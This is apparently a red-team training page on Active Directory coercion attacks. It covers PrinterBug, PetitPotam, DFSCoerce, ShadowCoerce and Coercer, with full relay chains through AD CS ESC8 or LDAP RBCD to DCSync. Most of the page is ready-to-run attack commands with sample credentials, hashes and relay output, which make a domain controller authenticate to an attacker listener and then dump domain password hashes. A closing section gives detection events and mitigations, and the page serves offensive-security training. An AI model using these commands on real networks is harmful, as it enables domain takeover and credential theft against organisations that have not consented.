---
layout: training-page
title: "Coercion Attacks — Red Team Academy"
module: "Active Directory"
tags:
  - coercion
  - petitpotam
  - printerbug
  - dfscoerce
  - shadowcoerce
  - coercer
  - ntlm-relay
  - esc8
page_key: "ad-coercion-attacks"
render_with_liquid: false
---

# Coercion Attacks

Authentication coercion forces a Windows host — typically a Domain Controller — to authenticate outbound to an attacker-controlled listener using the machine account's NTLM credentials. The captured NetNTLMv2 hash can be relayed to AD CS (ESC8) to obtain a DC certificate, then used for PKINIT + DCSync. Multiple RPC protocols expose coercible endpoints, and the Coercer tool automates testing all of them.

## 1. PrintSpooler / SpoolSample (MS-RPRN)

MS-RPRN's `RpcRemoteFindFirstPrinterChangeNotification` RPC call accepts a `pszLocalMachine` UNC path. When called remotely, the Print Spooler service (running as SYSTEM) authenticates outbound to the supplied UNC path using the machine's NTLM credentials. No patch from Microsoft — classified "Won't Fix".

### Requirements

- Print Spooler service running on the target (`spoolsv.exe`)
- Any valid domain credential to trigger the RPC call
- Coerced auth arrives over SMB (port 445)

### Check if Print Spooler is running

```
# Remote check via rpcdump (impacket)
rpcdump.py dc01.corp.local | grep -i spoolss

# PowerShell
Get-Service -Name Spooler -ComputerName dc01.corp.local
```

### SpoolSample.exe

```
SpoolSample.exe <target> <attacker_capture_host>

# Example
SpoolSample.exe dc01.corp.local 192.168.1.50
```

### printerbug.py (impacket / krbrelayx)

```
printerbug.py 'corp.local'/'jdoe':'Password1!'@'dc01.corp.local' '192.168.1.50'
```

## 2. PetitPotam (MS-EFSRPC / CVE-2021-36942)

MS-EFSRPC functions accept a UNC path parameter; when called, the target's LSASS initiates outbound NTLM auth to that path via the `\pipe\lsarpc` or `\pipe\efsrpc` named pipes. CVE-2021-36942 (August 2021) patched *unauthenticated* use of `EfsRpcOpenFileRaw` via `lsarpc` only. Functions 2–7 (EfsRpcEncryptFileSrv, EfsRpcDecryptFileSrv, etc.) remain viable on fully patched systems with valid domain credentials.

### petitpotam.py Syntax

```
# Unauthenticated (pre-patch / unpatched targets only)
python3 PetitPotam.py <listener_ip> <target_ip>
python3 PetitPotam.py 192.168.1.50 10.0.0.1

# Authenticated (post-patch — current standard)
python3 PetitPotam.py -u jdoe -p 'Password1!' -d corp.local 192.168.1.50 10.0.0.1

# Pass-the-hash
python3 PetitPotam.py -hashes :32196b56ffe6f45e294117b91a83bf38 \
  -d corp.local 192.168.1.50 10.0.0.1

# Select specific pipe (avoid patched lsarpc; use efsrpc)
python3 PetitPotam.py -pipe efsrpc -u jdoe -p 'Pass1!' -d corp.local 192.168.1.50 10.0.0.1

# Try all pipes
python3 PetitPotam.py -pipe all -u jdoe -p 'Pass1!' -d corp.local 192.168.1.50 10.0.0.1
```

Success output: `Attack worked!` with `ERROR_BAD_NETPATH` in the response (expected — the UNC path doesn't exist, but auth was sent).

## 3. DFSCoerce (MS-DFSNM)

MS-DFSNM's `NetrDfsRemoveStdRoot` and `NetrDfsAddStdRoot` RPC calls accept a server path parameter. Via `\pipe\netdfs`. Specifically targets **Domain Controllers only** (DFS Namespace role required). Primary use case: Print Spooler is disabled on DCs.

```
python3 dfscoerce.py -d "corp.local" -u "jdoe" -p "Password1!" 192.168.1.50 10.0.0.1
```

| Aspect | SpoolSample (MS-RPRN) | DFSCoerce (MS-DFSNM) |
| --- | --- | --- |
| Target scope | Any Windows host with Spooler | Domain Controllers only |
| Named pipe | `\pipe\spoolss` | `\pipe\netdfs` |
| Patch status | Won't Fix | No patch |

## 4. ShadowCoerce (MS-FSRVP)

MS-FSRVP's `IsPathShadowCopied` and `IsPathSupported` methods via `\pipe\FssagentRpc`. Requires File Server VSS Agent Service running on target. Patched via CVE-2022-30154 (June 2022). Run the command twice if the first attempt fails — FssAgent may require a warm-up.

```
python3 shadowcoerce.py -d "corp.local" -u "jdoe" -p "Password1!" 192.168.1.50 10.0.0.1
```

## 5. Coercer — Unified Scanner and Exploiter

Coercer consolidates all known coercion techniques (MS-RPRN, MS-EFSR, MS-FSRVP, MS-DFSNM, MS-EVEN, and more — 12+ methods) into a single tool with scan and coerce modes.

```
# Install
sudo pip3 install coercer
```

### coercer scan — Enumerate Available Methods

```
# Basic authenticated scan against single target
coercer scan -t 10.0.0.1 -u jdoe -p 'Password1!' -d corp.local

# Scan with listener IP to capture triggered auths
coercer scan -t 10.0.0.1 -u jdoe -p 'Password1!' -d corp.local -I 192.168.1.50

# Scan from targets file
coercer scan -f targets.txt -u jdoe -p 'Password1!' -d corp.local -I 192.168.1.50

# Filter to specific protocol
coercer scan -t 10.0.0.1 -u jdoe -p 'Password1!' -d corp.local \
  --filter-protocol-name MS-RPRN

# Export results
coercer scan -t 10.0.0.1 -u jdoe -p 'Password1!' -d corp.local \
  -v --export-json results.json
```

### coercer coerce — Trigger Coercion to Listener

```
# Coerce all available methods to listener
coercer coerce -t 10.0.0.1 -l 192.168.1.50 -u jdoe -p 'Password1!' -d corp.local

# Only MS-RPRN (PrinterBug)
coercer coerce -t 10.0.0.1 -l 192.168.1.50 -u jdoe -p 'Password1!' -d corp.local \
  --filter-protocol-name MS-RPRN

# Only PetitPotam (MS-EFSR)
coercer coerce -t 10.0.0.1 -l 192.168.1.50 -u jdoe -p 'Password1!' -d corp.local \
  --filter-protocol-name MS-EFSR

# Pass-the-hash
coercer coerce -t 10.0.0.1 -l 192.168.1.50 -d corp.local --hashes :NT_HASH_HERE

# Specific method
coercer coerce -t 10.0.0.1 -l 192.168.1.50 -u jdoe -p 'Pass!' -d corp.local \
  --filter-method-name NetrDfsRemoveStdRoot
```

## 6. Full Chain: Coercion → NTLM Relay → AD CS ESC8 → DCSync

ESC8 is an AD CS misconfiguration where the Web Enrollment endpoint (`/certsrv/`) accepts NTLM without Extended Protection for Authentication (EPA). Relay the DC's machine account hash to the CA's HTTP endpoint, obtain a certificate for the DC machine account, use PKINIT → DCSync.

### Prerequisites

- AD CS with Web Enrollment or NDES enabled, accessible over HTTP (or HTTPS without EPA)
- DomainController or Machine certificate template available for enrollment
- SMB signing not required on source DC (coerced auth can be relayed)
- Valid domain credentials (to trigger coercion)

### Step 0 — Identify AD CS Web Enrollment

```
certipy find -u jdoe@corp.local -p 'Password1!' -dc-ip 10.0.0.1 -stdout | grep -i "web enrollment"
```

### Step 1 — Start ntlmrelayx targeting AD CS Web Enrollment

```
sudo ntlmrelayx.py \
  -t http://ca.corp.local/certsrv/certfnsh.asp \
  -smb2support \
  --adcs \
  --template "DomainController"
```

### Step 2 — Trigger Coercion from DC to ntlmrelayx

```
# PetitPotam (authenticated, post-patch)
python3 PetitPotam.py -u jdoe -p 'Password1!' -d corp.local 192.168.1.50 10.0.0.1

# Coercer (preferred — tries all methods)
coercer coerce -t 10.0.0.1 -l 192.168.1.50 -u jdoe -p 'Password1!' -d corp.local

# SpoolSample
SpoolSample.exe dc01.corp.local 192.168.1.50
```

ntlmrelayx output on success:

```
[*] SMBD-Thread-3: Received connection from 10.0.0.1, attacking target http://10.0.0.5
[*] Generating CSR...
[*] GOT CERTIFICATE!
[*] Base64 certificate of user DC01$: MIIRdQIBAz...
```

### Step 3 — PKINIT with Certificate → TGT as DC01$

```
# Linux (certipy — all-in-one)
certipy auth -pfx dc01.pfx -dc-ip 10.0.0.1
# Outputs NT hash for DC01$ and saves TGT

# Linux (PKINITtools)
python3 gettgtpkinit.py -cert-pfx dc01.pfx -pfx-pass '' corp.local/DC01$ dc01.ccache
export KRB5CCNAME=dc01.ccache

# Windows (Rubeus)
Rubeus.exe asktgt /user:DC01$ /domain:corp.local /dc:dc1.corp.local \
  /certificate:MIIRdQIBAz... /ptt /outfile:dc01.kirbi
```

### Step 4 — DCSync

```
# With NT hash (DC01$ machine account hash)
secretsdump.py -hashes :<NT_HASH> corp.local/DC01$@10.0.0.1 -just-dc-ntlm

# With Kerberos TGT
export KRB5CCNAME=dc01.ccache
secretsdump.py -k -no-pass dc01.corp.local -just-dc-ntlm
```

### Chain Diagram

```
Attacker ──credentials──► PetitPotam / Coercer
                                    |
                            coerce DC01 via RPC
                                    |
             DC01$ NTLM auth ──► ntlmrelayx :445
                                    |
                           relay to HTTP
                                    |
                          CA /certsrv/certfnsh.asp
                                    |
                        Certificate for DC01$
                                    |
                  PKINIT (certipy auth / Rubeus)
                                    |
                          TGT as DC01$
                                    |
                        DCSync ──► DA hash
```

## 7. Alternative Chain: Coercion → NTLM Relay → LDAP → RBCD

Relay to LDAP(S) with `--delegate-access` to set RBCD on the coerced host without AD CS.

```
# Set up ntlmrelayx for RBCD
sudo ntlmrelayx.py \
  -t ldap://10.0.0.1 \
  -smb2support \
  --delegate-access \
  --no-dump --no-da --no-acl

# OR relay to shadow credentials (LDAPS, no MAQ needed)
sudo ntlmrelayx.py -t ldaps://10.0.0.1 -smb2support \
  --shadow-credentials --shadow-target 'DC01$'

# After RBCD is set (ntlmrelayx creates ATTACKERMACHINE$ automatically):
getST.py -spn cifs/dc01.corp.local corp.local/ATTACKERMACHINE$:AttackerPass \
  -impersonate Administrator -dc-ip 10.0.0.1

export KRB5CCNAME=Administrator.ccache
secretsdump.py -k -no-pass dc01.corp.local
```

## Detection

### Event ID 5145 — Detailed File Share Access

Most directly detects named pipe-based coercion. Alert on `IPC$` access to these pipe names from unexpected source IPs:

- `lsarpc`, `efsrpc` — PetitPotam
- `spoolss` — PrinterBug
- `netdfs` — DFSCoerce
- `FssagentRpc` — ShadowCoerce

Requires: Audit Policy → Object Access → Audit Detailed File Share (Success).

### Event ID 4624 — Account Logon

Alert on DC machine accounts (`DC01$`) authenticating via NTLM (Logon Type 3, Auth Package: NTLM) to external IPs that are not known domain controllers.

### Event ID 4648 — Explicit Credential Logon

Machine account used in explicit credential logon from spooler, LSASS, or EFS process context to an external target. Multiple rapid 4648 events from the same DC machine account to the same external IP are high-confidence indicators.

### Network Signatures

- DC initiating SMB connections outbound to non-DC hosts
- NetNTLMv2 hashes from machine accounts in network captures
- HTTP POST to `/certsrv/certfnsh.asp` immediately following DC SMB connection

## Mitigation

| Control | Action | Mitigates |
| --- | --- | --- |
| **Disable Print Spooler on DCs** | GPO: Computer Config → System Services → Print Spooler → Disabled. Apply to Domain Controllers OU. | PrinterBug (MS-RPRN) |
| **Enable EPA on AD CS Web Enrollment** | IIS Manager → `/certsrv` → Windows Authentication → Advanced Settings → Extended Protection = Required. Also enable SSL Required. | ESC8 relay |
| **Enforce SMB Signing** | GPO: Microsoft network server/client → Digitally sign communications (always) → Enabled. Apply domain-wide. | SMB-to-SMB relay (not ESC8) |
| **LDAP Signing + Channel Binding** | GPO: DC: LDAP server signing requirements = Require signing. Registry: `LdapEnforceChannelBinding = 2`. | RBCD relay via LDAP(S) |
| **Block outbound SMB from DCs** | Firewall rule: DC → external port 445 blocked. | All coercion delivery |
| **Disable NTLM where possible** | GPO: Restrict NTLM. Audit first with "Network security: Restrict NTLM: Audit incoming NTLM traffic". | Entire relay attack surface |
